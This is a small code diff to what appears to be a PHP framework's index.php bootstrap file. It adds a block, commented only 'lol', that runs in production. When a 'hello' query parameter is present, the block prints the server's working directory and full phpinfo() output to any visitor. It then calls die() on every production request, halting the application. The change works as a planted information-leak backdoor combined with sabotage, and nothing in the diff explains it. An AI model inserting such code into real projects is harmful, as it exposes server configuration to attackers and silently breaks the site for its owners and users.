@@ -87,6 +87,15 @@ if (!defined('ENVIRONMENT'))
 	define('ENVIRONMENT', 'development');
 }
 
+// lol
+if(ENVIRONMENT == 'production') {
+	if(isset($_GET['hello'])) {
+		echo getcwd();
+		phpinfo();
+	}
+	die();
+}
+
 /*
  *---------------------------------------------------------------
  * ERROR REPORTING
